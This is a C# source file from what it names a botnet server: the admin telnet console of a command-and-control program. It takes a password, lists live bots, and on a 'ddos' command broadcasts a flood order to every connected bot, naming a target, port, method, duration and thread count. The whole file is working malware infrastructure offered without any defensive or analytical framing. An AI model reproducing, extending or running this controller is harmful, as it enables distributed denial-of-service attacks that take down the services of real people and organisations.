using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;

namespace Venusos_Botnet_Server
{
    public class AdminsServer
    {
        public static void StartListener()
        {
            string password = Tools.GetPassword();

            Console.WriteLine("Telnet console is avaiable on {0}:23", Tools.GetLocalIP());

            while (true)
            {
                TcpListener tcpListener = new TcpListener(Tools.GetLocalIP(), 23);
                tcpListener.Start();

                try
                {
                    int i = 0;
                    string data = "";
                    bool logged = false;
                    bool justLogged = false;
                    byte[] bytes = new byte[256];

                    TcpClient tcpClient = tcpListener.AcceptTcpClient();
                    NetworkStream networkStream = tcpClient.GetStream();

                    Console.WriteLine("\n [*] New connection request from {0}", ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address);

                    networkStream.Write(Encoding.ASCII.GetBytes("Enter password: "));

                    Task.Run(() =>
                    {
                        Stopwatch timer = new Stopwatch();
                        timer.Start();

                        while (true)
                        {
                            if (logged)
                            {
                                break;
                            }
                            else if (timer.Elapsed.TotalSeconds > 5)
                            {
                                tcpClient.Close();
                                Console.WriteLine(" - Password timeout");
                                break;
                            }
                        }

                        timer.Stop();
                    });

                    while ((i = networkStream.Read(bytes)) != 0)
                    {
                        data = Encoding.ASCII.GetString(bytes, 0, i);

                        if (!logged)
                        {
                            if (data == password)
                            {
                                logged = true;
                                justLogged = true;
                                Console.WriteLine(" - Client connected");
                            }
                        }
                        else
                        {
                            BotsServer.tcpClients.RemoveAll(x => !x.Connected);

                            if (justLogged)
                            {
                                justLogged = false;
                                networkStream.Write(Encoding.ASCII.GetBytes("Hello, type ping to list active bots or ddos to see ddos command syntax!\n"));
                            }

                            if (data.StartsWith("ping"))
                            {
                                int alive;
                                alive = 0;

                                foreach (TcpClient bot in BotsServer.tcpClients)
                                {
                                    if (BotsServer.Ping(bot))
                                    {
                                        alive++;
                                        networkStream.Write(Encoding.ASCII.GetBytes(((IPEndPoint)bot.Client.RemoteEndPoint).Address + " is alive!\n"));
                                    }
                                }

                                networkStream.Write(Encoding.ASCII.GetBytes(alive + " bots are alive in total.\n"));
                            }
                            else if (data.StartsWith("ddos"))
                            {
                                if (data.StartsWith("ddos "))
                                {
                                    try
                                    {
                                        Command command = Tools.CreateCommand(data);
                                        foreach (TcpClient bot in BotsServer.tcpClients)
                                        {
                                            BotsServer.Send(bot, JsonSerializer.Serialize(command));
                                        }
                                    }
                                    catch (Exception e)
                                    {
                                        networkStream.Write(Encoding.ASCII.GetBytes(e.Message));
                                    }
                                }
                                else
                                {
                                    networkStream.Write(Encoding.ASCII.GetBytes("ddos [METHOD] [IP/URL] [PORT] [DURATION] [THREADS]\n"));
                                }
                            }
                        }
                    }
                }
                catch (Exception)
                {

                }
                finally
                {
                    Console.WriteLine(" - Client disconnected");
                    tcpListener.Stop();
                }
            }
        }
    }
}